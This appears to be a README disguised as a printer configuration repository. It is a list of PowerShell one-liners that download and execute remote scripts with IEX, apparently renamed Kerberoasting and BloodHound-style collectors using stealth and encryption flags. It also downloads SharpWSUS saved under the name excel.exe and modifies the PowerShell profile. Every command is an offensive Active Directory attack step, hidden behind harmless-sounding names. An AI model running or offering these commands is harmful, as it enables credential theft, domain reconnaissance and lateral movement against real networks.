# printerconfiguration


```
$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials 
```

```
IEX($browser).DownloadString('https://raw.githubusercontent.com/tigerion/printerconfiguration/main/printeroast.ps1');I-KR -OutputFormat Hashcat
```

```
IEX($browser).DownloadString('https://raw.githubusercontent.com/tigerion/printerconfiguration/main/printerSharp.ps1');I-BH -CollectionMethod DCOnly -Stealth -NoSaveCache -RandomizeFilenames -EncryptZip
```

```
(New-Object System.Net.WebClient).DownloadFile("http://github.com/tigerion/printerconfiguration/raw/refs/heads/main/SharpWSUS.exe", "C:\temp\excel.exe")
```
```
New-Item -Path $PROFILE -ItemType File -Force | Out-Null; Add-Content -Path $PROFILE -Value 'Set-PSReadLineOption -HistorySaveStyle SaveIncrementally; function prompt { $timestamp = Get-Date -Format "[HH:mm:ss]"; Write-Host "$timestamp " -NoNewline -ForegroundColor DarkGray; Write-Host "PS $($executionContext.SessionState.Path.CurrentLocation)$(`">\"` * ($nestedPromptLevel + 1)) " -NoNewline; return \" \" }'
```
After
```
. $PROFILE
```
